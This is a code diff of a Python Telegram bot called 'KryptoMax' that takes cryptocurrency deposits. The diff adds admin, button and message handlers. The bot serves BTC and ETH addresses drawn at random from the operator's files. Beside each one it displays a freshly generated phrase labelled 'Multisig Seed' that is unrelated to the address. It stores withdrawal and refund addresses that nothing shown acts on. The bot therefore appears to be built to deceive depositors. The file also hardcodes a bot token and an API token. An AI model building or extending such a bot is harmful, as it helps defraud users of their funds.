@@ -5,7 +5,7 @@ import requests
 import time
 import os
 
-# === CONFIGURATION ===
+# ===== CONFIGURATION =====
 BOT_TOKEN = "7415463958:AAFB-KIiUvnStRTKcqxnJTEpFonoWjl9FAA"
 BLOCKCYPHER_TOKEN = "b4aa61c7eab349bcb23a897c9734b211"
 BTC_ADDRESS_FILE = "btc_addresses.txt"
@@ -13,13 +13,13 @@ ETH_ADDRESS_FILE = "eth_addresses.txt"
 PGP_KEY_FILE = "pgp.txt"
 ADMIN_ID = 6190128347
 
-# === Storage ===
+# ===== STORAGE =====
 user_states = {}
 refund_addresses = {}
 withdrawal_requests = {}
 user_data = set()
 
-# === Helper Functions ===
+# ===== HELPER FUNCTIONS =====
 def get_pgp_key():
     try:
         with open(PGP_KEY_FILE, 'r') as f:
@@ -55,7 +55,7 @@ def check_blockchain_for_tx(address, coin):
         print("Blockchain check error:", e)
     return None, 0, 0
 
-# === Command Handlers ===
+# ===== COMMAND HANDLERS =====
 def start(update: Update, context: CallbackContext):
     user_id = update.message.from_user.id
     user_data.add(user_id)
@@ -93,6 +93,42 @@ def confirm(update: Update, context: CallbackContext):
     else:
         update.message.reply_text("❌ No confirmed transactions found. Try again later.")
 
+def admin(update: Update, context: CallbackContext):
+    user_id = update.message.from_user.id
+    if user_id != ADMIN_ID:
+        update.message.reply_text("Unauthorized.")
+        return
+
+    keyboard = ReplyKeyboardMarkup([
+        ["Users", "Deposits"],
+        ["Withdrawals", "Refunds"]
+    ], resize_keyboard=True)
+
+    update.message.reply_text("👨‍💼 Admin Dashboard\nChoose an option:", reply_markup=keyboard)
+
+def admin_panel_handler(update: Update, context: CallbackContext):
+    user_id = update.message.from_user.id
+    if user_id != ADMIN_ID:
+        return
+
+    text = update.message.text
+    if text == "Users":
+        update.message.reply_text(f"👤 Total Users: {len(user_data)}")
+    elif text == "Deposits":
+        update.message.reply_text("Deposit addresses are loaded from file and rotated randomly.")
+    elif text == "Withdrawals":
+        if not withdrawal_requests:
+            update.message.reply_text("No withdrawals yet.")
+        else:
+            for uid, addr in withdrawal_requests.items():
+                update.message.reply_text(f"User {uid}: {addr}")
+    elif text == "Refunds":
+        if not refund_addresses:
+            update.message.reply_text("No refund addresses.")
+        else:
+            for uid, addr in refund_addresses.items():
+                update.message.reply_text(f"User {uid}: {addr}")
+
 def pgp_command(update: Update, context: CallbackContext):
     key = get_pgp_key()
     update.message.reply_text(
@@ -118,9 +154,59 @@ def guide(update: Update, context: CallbackContext):
 """
     update.effective_message.reply_text(guide_text, parse_mode="Markdown")
 
-# ... [Keep all your other existing functions unchanged] ...
+def button_handler(update: Update, context: CallbackContext):
+    query = update.callback_query
+    user_id = query.from_user.id
+    query.answer()
 
-# === Main Function ===
+    if query.data == "deposit_btc":
+        phrase = generate_seed_phrase()
+        btc_address = get_random_address(BTC_ADDRESS_FILE)
+        user_states[user_id] = {"coin": "btc", "address": btc_address}
+        msg = f"💰 *BTC Deposit Address:* `{btc_address}`\n\n🔐 *Multisig Seed:* `{phrase}`\n\nSend BTC. Auto-detection enabled.\n\nVerify PGP: /pgp"
+        query.edit_message_text(msg, parse_mode="Markdown")
+
+    elif query.data == "deposit_eth":
+        phrase = generate_seed_phrase()
+        eth_address = get_random_address(ETH_ADDRESS_FILE)
+        user_states[user_id] = {"coin": "eth", "address": eth_address}
+        msg = f"💰 *ETH Deposit Address:* `{eth_address}`\n\n🔐 *Multisig Seed:* `{phrase}`\n\nSend ETH. Auto-detection enabled.\n\nVerify PGP: /pgp"
+        query.edit_message_text(msg, parse_mode="Markdown")
+
+    elif query.data == "show_guide":
+        guide(update, context)
+        
+    elif query.data == "show_pgp":
+        key = get_pgp_key()
+        query.edit_message_text(
+            f"🔏 *Official Verification Key*\n\n"
+            f"```\n{key}\n```\n\n"
+            f"Compare with all signed messages from KryptoMax.",
+            parse_mode="Markdown"
+        )
+
+def message_handler(update: Update, context: CallbackContext):
+    user_id = update.message.from_user.id
+    msg = update.message.text
+
+    if user_id in user_states:
+        state = user_states[user_id]
+
+        if state.get("awaiting_withdraw"):
+            withdrawal_requests[user_id] = msg
+            state["awaiting_withdraw"] = False
+            update.message.reply_text("✅ Withdrawal address saved.")
+            update.message.reply_text("Please enter a *refund address* (optional):", parse_mode="Markdown")
+            state["awaiting_refund"] = True
+            return
+
+        if state.get("awaiting_refund"):
+            refund_addresses[user_id] = msg
+            state["awaiting_refund"] = False
+            update.message.reply_text("✅ Refund address saved. Transaction flow complete!")
+            return
+
+# ===== MAIN FUNCTION =====
 def main():
     # Verify required files exist
     required_files = [BTC_ADDRESS_FILE, ETH_ADDRESS_FILE, "english.txt", PGP_KEY_FILE]
@@ -133,10 +219,10 @@ def main():
 
     # Command handlers
     dp.add_handler(CommandHandler("start", start))
-    dp.add_handler(CommandHandler("confirm", confirm))  # Now properly defined
+    dp.add_handler(CommandHandler("confirm", confirm))
+    dp.add_handler(CommandHandler("admin", admin))
     dp.add_handler(CommandHandler("pgp", pgp_command))
     dp.add_handler(CommandHandler("guide", guide))
-    dp.add_handler(CommandHandler("admin", admin))
 
     # Other handlers
     dp.add_handler(CallbackQueryHandler(button_handler))
